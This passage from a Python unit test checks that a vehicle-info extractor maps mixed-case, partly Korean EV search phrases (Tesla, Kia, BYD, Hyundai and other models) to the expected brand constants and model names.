            ("Ioniq 5 N 서킷", BRAND_HYUNDAI, "아이오닉5 N"),
            ("EV6 GT 제로백", BRAND_KIA, "EV6 GT"),
            ("ev6 gt 제로백", BRAND_KIA, "EV6 GT"),
            ("Ev6 Gt 제로백", BRAND_KIA, "EV6 GT"),
            ("MODEL Y 롱레인지", BRAND_TESLA, "Model Y"),
            ("model y 롱레인지", BRAND_TESLA, "Model Y"),
            ("Model Y 롱레인지", BRAND_TESLA, "Model Y"),
            ("CYBERTRUCK 오프로드", BRAND_TESLA, "Cybertruck"),
            ("cybertruck 오프로드", BRAND_TESLA, "Cybertruck"),
            ("CybeRtrUck 오프로드", BRAND_TESLA, "Cybertruck"),
            ("ATTO 3 배터리", BRAND_BYD, "Atto 3"),
            ("atto 3 배터리", BRAND_BYD, "Atto 3"),
            ("AtTo 3 배터리", BRAND_BYD, "Atto 3"),
            ("BMW I4 eDrive40", BRAND_OTHER, "BMW i4"),
            ("bmw i4 edrive40", BRAND_OTHER, "BMW i4"),
            ("AUDI E-TRON 55", BRAND_OTHER, "Audi e-tron"),
            ("audi e-tron 55", BRAND_OTHER, "Audi e-tron"),
            ("POLESTAR 4 싱글모터", BRAND_OTHER, "폴스타 4"),
            ("polestar 4 싱글모터", BRAND_OTHER, "폴스타 4"),
            ("VOLKSWAGEN ID.4 프로", BRAND_OTHER, "Volkswagen ID.4"),
            ("vw id.4 프로", BRAND_OTHER, "Volkswagen ID.4"),
            ("CADILLAC LYRIQ 럭셔리", BRAND_OTHER, "Cadillac Lyriq"),
            ("cadillac lyriq 럭셔리", BRAND_OTHER, "Cadillac Lyriq"),
        ]

        for text, exp_b, exp_m in case_matrix:
            b, m = extract_vehicle_info(text)
            self.assertEqual(b, exp_b, f"Brand mismatch for '{text}'")
            self.assertEqual(m, exp_m, f"Model mismatch for '{text}'")


if __name__ == "__main__":
    unittest.main()
